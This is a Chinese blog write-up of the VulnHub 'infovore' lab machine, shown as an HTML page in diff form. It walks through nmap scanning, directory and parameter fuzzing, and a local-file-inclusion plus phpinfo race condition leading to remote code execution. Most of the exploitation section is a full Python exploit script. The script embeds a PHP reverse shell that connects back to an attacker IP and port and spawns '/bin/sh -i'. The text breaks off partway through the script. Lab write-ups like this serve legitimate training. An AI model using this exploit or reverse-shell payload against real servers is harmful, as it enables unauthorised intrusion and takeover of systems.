@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Bantian">
+
+
+
+
+
+<title>VulnHub_infovore | Bantian</title>
+
+
+
+    <link rel="icon" href="/my.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bantian&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bantian&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">VulnHub_infovore</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Bantian</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">2020-08-09&nbsp;&nbsp;17:02:23</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="从VulnHub-infovore靶机学习lfi-phpinfo-gt-RCE"><a href="#从VulnHub-infovore靶机学习lfi-phpinfo-gt-RCE" class="headerlink" title="从VulnHub_infovore靶机学习lfi+phpinfo=&gt;RCE"></a>从VulnHub_infovore靶机学习lfi+phpinfo=&gt;RCE</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>local file inclusion + phpinfo =&gt; RCE</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>靶机： <a href="https://www.vulnhub.com/entry/infovore-1,496/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/infovore-1,496/</a></p>
+<p>上nmap收集目标主机的ip地址：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ nmap -sP 192.168.247.1/24</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-08 03:09 EDT</span><br><span class="line">Nmap scan report for 192.168.247.1</span><br><span class="line">Host is up (0.0012s latency).</span><br><span class="line">Nmap scan report for 192.168.247.2</span><br><span class="line">Host is up (0.0010s latency).</span><br><span class="line">Nmap scan report for 192.168.247.210</span><br><span class="line">Host is up (0.00019s latency).</span><br><span class="line">Nmap scan report for 192.168.247.224</span><br><span class="line">Host is up (0.0015s latency).</span><br><span class="line">Nmap done: 256 IP addresses (4 hosts up) scanned in 2.93 seconds</span><br></pre></td></tr></table></figure>
+
+<p>目标主机的ip地址为192.168.247.224。</p>
+<p>探测下目标主机上开启的服务：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ nmap -p1-65535 -A 192.168.247.224 -oN /tmp/infovore</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-08 03:12 EDT</span><br><span class="line">Nmap scan report for 192.168.247.224</span><br><span class="line">Host is up (0.00094s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Include me ...</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 9.10 seconds</span><br></pre></td></tr></table></figure>
+
+<p>仅仅在80端口开启了http服务。</p>
+<h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>访问<a href="http://192.168.247.224" target="_blank" rel="noopener">http://192.168.247.224</a> :</p>
+<p><img src="/2020/08/09/VulnHub_infovore/imgs/2.png" alt="2"></p>
+<p>在标签页上发现了提示<code>Include me...</code>，说明存在一个文件包含漏洞。但是怎么利用还没有头绪。</p>
+<p>再利用<code>dirb</code>扫描网站的目录，发现了<a href="http://192.168.247.224/info.php" target="_blank" rel="noopener">http://192.168.247.224/info.php</a> ：</p>
+<p><img src="/2020/08/09/VulnHub_infovore/imgs/3.png" alt="3"></p>
+<p>发现文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+ http:&#x2F;&#x2F;192.168.247.224&#x2F;index.php (CODE:200|SIZE:4743)          </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.247.224&#x2F;info.php (CODE:200|SIZE:69878)</span><br></pre></td></tr></table></figure>
+
+<p>其中info.php是一个探针文件：</p>
+<p><img src="/2020/08/09/VulnHub_infovore/imgs/4.png" alt="4"></p>
+<p>除此之外并没有其他的有利用价值的文件或是目录被发现，所以只能认为文件包含漏洞存在在<code>index.php</code>中，用burp fuzz一下。</p>
+<p>拦截请求，发送到intruder，因为不知道parameter是什么，所以对parameter进行fuzz：</p>
+<p><img src="/2020/08/09/VulnHub_infovore/imgs/5.png" alt="5"></p>
+<p>payloads选用SecLists中的两个字典：</p>
+<p><a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt" target="_blank" rel="noopener">https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt</a></p>
+<p><a href="https://github.com/danielmiessler/SecLists/blob/67bdc2032effada01a821ae1daf775a94aff010d/Fuzzing/LFI/LFI-Jhaddix.txt" target="_blank" rel="noopener">https://github.com/danielmiessler/SecLists/blob/67bdc2032effada01a821ae1daf775a94aff010d/Fuzzing/LFI/LFI-Jhaddix.txt</a></p>
+<p><img src="/2020/08/09/VulnHub_infovore/imgs/6.png" alt="6"></p>
+<p>线程可以选择大一点，爆破之后，发现parameter是<strong>filename</strong>：</p>
+<p><img src="/2020/08/09/VulnHub_infovore/imgs/8.png" alt="8"></p>
+<p>在其他情况下，会返回正常的页面：</p>
+<p><img src="/2020/08/09/VulnHub_infovore/imgs/9.png" alt="9"></p>
+<p>文件包含漏洞的利用方式为<a href="http://192.168.247.224/index.php?filename=" target="_blank" rel="noopener">http://192.168.247.224/index.php?filename=</a> 。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>现在已经知道目标站点上泄露了一个phpinfo文件并且存在一个文件包含漏洞，利用这两个文件，可以上传一个web shell，从而实现rce。</p>
+<p>我们可以直接利用github上现成的exp，exp来自 <a href="https://github.com/M4LV0/LFI-phpinfo-RCE/blob/master/exploit.py" target="_blank" rel="noopener">https://github.com/M4LV0/LFI-phpinfo-RCE/blob/master/exploit.py</a>  ，需要修改几个点：一个是line 12和line 13的ip地址和port，是反弹shell之后接收shell的ip和port；另外两处是line 139和line 148，修改为对应的phpinfo文件和文件包含漏洞文件：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup</span><span class="params">(host, port)</span>:</span></span><br><span class="line">    TAG=<span class="string">"Security Test"</span></span><br><span class="line">    PAYLOAD=<span class="string">"""%s\r</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">set_time_limit (0);</span></span><br><span class="line"><span class="string">$VERSION = "1.0";</span></span><br><span class="line"><span class="string">$ip = '192.168.247.210';  // CHANGE THIS</span></span><br><span class="line"><span class="string">$port = 23333;       // CHANGE THIS</span></span><br><span class="line"><span class="string">$chunk_size = 1400;</span></span><br><span class="line"><span class="string">$write_a = null;</span></span><br><span class="line"><span class="string">$error_a = null;</span></span><br><span class="line"><span class="string">$shell = 'uname -a; w; id; /bin/sh -i';</span></span><br><span class="line"><span class="string">$daemon = 0;</span></span><br><span class="line"><span class="string">$debug = 0;</span></span><br><span class="line"><span class="string">//</span></span><br><span class="line"><span class="string">// Daemonise ourself if possible to avoid zombies later</span></span><br><span class="line"><span class="string">//</span></span><br><span class="line"><span class="string">// pcntl_fork is hardly ever available, but will allow us to daemonise</span></span><br><span class="line"><span class="string">// our php process and avoid zombies.  Worth a try...</span></span><br><span class="line"><span class="string">if (function_exists('pcntl_fork')) &#123;</span></span><br><span class="line"><span class="string">	// Fork and have the parent process exit</span></span><br><span class="line"><span class="string">	$pid = pcntl_fork();</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	if ($pid == -1) &#123;</span></span><br><span class="line"><span class="string">		printit("ERROR: Can't fork");</span></span><br><span class="line"><span class="string">		exit(1);</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	if ($pid) &#123;</span></span><br><span class="line"><span class="string">		exit(0);  // Parent exits</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">	// Make the current process a session leader</span></span><br><span class="line"><span class="string">	// Will only succeed if we forked</span></span><br><span class="line"><span class="string">	if (posix_setsid() == -1) &#123;</span></span><br><span class="line"><span class="string">		printit("Error: Can't setsid()");</span></span><br><span class="line"><span class="string">		exit(1);</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">	$daemon = 1;</span></span><br><span class="line"><span class="string">&#125; else &#123;</span></span><br><span class="line"><span class="string">	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">// Change to a safe directory</span></span><br><span class="line"><span class="string">chdir("/");</span></span><br><span class="line"><span class="string">// Remove any umask we inherited</span></span><br><span class="line"><span class="string">umask(0);</span></span><br><span class="line"><span class="string">//</span></span><br><span class="line"><span class="string">// Do the reverse shell...</span></span><br><span class="line"><span class="string">//</span></span><br><span class="line"><span class="string">// Open reverse connection</span></span><br><span class="line"><span class="string">$sock = fsockopen($ip, $port, $errno, $errstr, 30);</span></span><br><span class="line"><span class="string">if (!$sock) &#123;</span></span><br><span class="line"><span class="string">	printit("$errstr ($errno)");</span></span><br><span class="line"><span class="string">	exit(1);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">// Spawn shell process</span></span><br><span class="line"><span class="string">$descriptorspec = array(</span></span><br><span class="line"><span class="string">   0 =&gt; array("pipe", "r"),  // stdin is a pipe that the child will read from</span></span><br><span class="line"><span class="string">   1 =&gt; array("pipe", "w"),  // stdout is a pipe that the child will write to</span></span><br><span class="line"><span class="string">   2 =&gt; array("pipe", "w")   // stderr is a pipe that the child will write to</span></span><br><span class="line"><span class="string">);</span></span><br><span class="line"><span class="string">$process = proc_open($shell, $descriptorspec, $pipes);</span></span><br><span class="line"><span class="string">if (!is_resource($process)) &#123;</span></span><br><span class="line"><span class="string">	printit("ERROR: Can't spawn shell");</span></span><br><span class="line"><span class="string">	exit(1);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">// Set everything to non-blocking</span></span><br><span class="line"><span class="string">// Reason: Occsionally reads will block, even though stream_select tells us they won't</span></span><br><span class="line"><span class="string">stream_set_blocking($pipes[0], 0);</span></span><br><span class="line"><span class="string">stream_set_blocking($pipes[1], 0);</span></span><br><span class="line"><span class="string">stream_set_blocking($pipes[2], 0);</span></span><br><span class="line"><span class="string">stream_set_blocking($sock, 0);</span></span><br><span class="line"><span class="string">printit("Successfully opened reverse shell to $ip:$port");</span></span><br><span class="line"><span class="string">while (1) &#123;</span></span><br><span class="line"><span class="string">	// Check for end of TCP connection</span></span><br><span class="line"><span class="string">	if (feof($sock)) &#123;</span></span><br><span class="line"><span class="string">		printit("ERROR: Shell connection terminated");</span></span><br><span class="line"><span class="string">		break;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">	// Check for end of STDOUT</span></span><br><span class="line"><span class="string">	if (feof($pipes[1])) &#123;</span></span><br><span class="line"><span class="string">		printit("ERROR: Shell process terminated");</span></span><br><span class="line"><span class="string">		break;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">	// Wait until a command is end down $sock, or some</span></span><br><span class="line"><span class="string">	// command output is available on STDOUT or STDERR</span></span><br><span class="line"><span class="string">	$read_a = array($sock, $pipes[1], $pipes[2]);</span></span><br><span class="line"><span class="string">	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);</span></span><br><span class="line"><span class="string">	// If we can read from the TCP socket, send</span></span><br><span class="line"><span class="string">	// data to process's STDIN</span></span><br><span class="line"><span class="string">	if (in_array($sock, $read_a)) &#123;</span></span><br><span class="line"><span class="string">		if ($debug) printit("SOCK READ");</span></span><br><span class="line"><span class="string">		$input = fread($sock, $chunk_size);</span></span><br><span class="line"><span class="string">		if ($debug) printit("SOCK: $input");</span></span><br><span class="line"><span class="string">		fwrite($pipes[0], $input);</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">	// If we can read from the process's STDOUT</span></span><br><span class="line"><span class="string">	// send data down tcp connection</span></span><br><span class="line"><span class="string">	if (in_array($pipes[1], $read_a)) &#123;</span></span><br><span class="line"><span class="string">		if ($debug) printit("STDOUT READ");</span></span><br><span class="line"><span class="string">		$input = fread($pipes[1], $chunk_size);</span></span><br><span class="line"><span class="string">		if ($debug) printit("STDOUT: $input");</span></span><br><span class="line"><span class="string">		fwrite($sock, $input);</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">	// If we can read from the process's STDERR</span></span><br><span class="line"><span class="string">	// send data down tcp connection</span></span><br><span class="line"><span class="string">	if (in_array($pipes[2], $read_a)) &#123;</span></span><br><span class="line"><span class="string">		if ($debug) printit("STDERR READ");</span></span><br><span class="line"><span class="string">		$input = fread($pipes[2], $chunk_size);</span></span><br><span class="line"><span class="string">		if ($debug) printit("STDERR: $input");</span></span><br><span class="line"><span class="string">		fwrite($sock, $input);</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">fclose($sock);</span></span><br><span class="line"><span class="string">fclose($pipes[0]);</span></span><br><span class="line"><span class="string">fclose($pipes[1]);</span></span><br><span class="line"><span class="string">fclose($pipes[2]);</span></span><br><span class="line"><span class="string">proc_close($process);</span></span><br><span class="line"><span class="string">// Like print, but does nothing if we've daemonised ourself</span></span><br><span class="line"><span class="string">// (I can't figure out how to redirect STDOUT like a proper daemon)</span></span><br><span class="line"><span class="string">function printit ($string) &#123;</span></span><br><span class="line"><span class="string">	if (!$daemon) &#123;</span></span><br><span class="line"><span class="string">		print "$string\n";</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt; </span></span><br><span class="line"><span class="string">\r"""</span> % TAG</span><br><span class="line">    REQ1_DATA=<span class="string">"""-----------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r</span></span><br><span class="line"><span class="string">Content-Type: text/plain\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">-----------------------------7dbff1ded0714--\r"""</span> % PAYLOAD</span><br><span class="line">    padding=<span class="string">"A"</span> * <span class="number">6000</span></span><br><span class="line">    REQ1=<span class="string">"""POST /info.php?a="""</span>+padding+<span class="string">""" HTTP/1.1\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT: """</span> + padding + <span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_USER_AGENT: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Length: %s\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s"""</span> %(len(REQ1_DATA),host,REQ1_DATA)</span><br><span class="line">    <span class="comment">#modify this to suit the LFI script   </span></span><br><span class="line">    LFIREQ=<span class="string">"""GET /index.php?filename=%s HTTP/1.1\r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/4.0\r</span></span><br><span class="line"><span class="string">Proxy-Connection: Keep-Alive\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">    <span class="keyword">return</span> (REQ1, TAG, LFIREQ)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">phpInfoLFI</span><span class="params">(host, port, phpinforeq, offset, lfireq, tag)</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    </span><br><span class="line"></span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s2.connect((host, port))</span><br><span class="line"></span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    d = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> len(d) &lt; offset:</span><br><span class="line">        d += s.recv(offset)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = d.index(<span class="string">"[tmp_name] =&amp;gt"</span>)</span><br><span class="line">        fn = d[i+<span class="number">17</span>:i+<span class="number">31</span>]</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    s2.send(lfireq % (fn, host))</span><br><span class="line">    d = s2.recv(<span class="number">4096</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    s2.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> d.find(tag) != <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">return</span> fn</span><br><span class="line"></span><br><span class="line">counter=<span class="number">0</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadWorker</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, e, l, m, *args)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.event = e</span><br><span class="line">        self.lock =  l</span><br><span class="line">        self.maxattempts = m</span><br><span class="line">        self.args = args</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> counter</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.event.is_set():</span><br><span class="line">            <span class="keyword">with</span> self.lock:</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= self.maxattempts:</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                counter+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                x = phpInfoLFI(*self.args)</span><br><span class="line">                <span class="keyword">if</span> self.event.is_set():</span><br><span class="line">                    <span class="keyword">break</span>                </span><br><span class="line">                <span class="keyword">if</span> x:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"\nGot it! Shell created in /tmp/g"</span></span><br><span class="line">                    